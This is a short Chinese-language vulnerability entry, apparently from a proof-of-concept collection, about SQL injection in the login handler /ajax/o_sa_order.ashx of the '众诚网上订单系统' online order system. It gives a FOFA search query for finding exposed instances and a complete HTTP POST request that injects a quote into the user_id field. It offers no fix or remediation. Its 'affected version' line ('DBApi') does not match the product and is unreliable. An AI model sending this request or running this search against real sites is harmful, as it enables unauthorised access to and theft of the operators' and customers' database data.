# 众诚网上订单系统o_sa_order存在SQL注入漏洞

# 一、漏洞简介
众诚网上订单系统o_sa_order存在SQL注入漏洞，攻击者可获取数据库敏感信息。

# 二、影响版本
+ DBApi

# 三、资产测绘
+ fofa`title="欢迎使用众诚网上订单系统"`
+ 特征

![1725327701850-b2fe295e-5169-4bf6-a0bf-451d4d6b9a96.png](./img/3-Rm4Tgak8tfb8DR/1725327701850-b2fe295e-5169-4bf6-a0bf-451d4d6b9a96-637276.png)

# 四、漏洞复现
```plain
POST /ajax/o_sa_order.ashx HTTP/1.1
Host: 
Content-Length: 42
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
 
type=login&user_id=admin'&user_pwd=1111111
```

![1725327746928-f84f08d3-735c-4fb4-9b17-0fafb6d5bb35.png](./img/3-Rm4Tgak8tfb8DR/1725327746928-f84f08d3-735c-4fb4-9b17-0fafb6d5bb35-682291.png)





> 更新: 2024-10-22 09:36:10  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ey0ogvbchsz4zpil>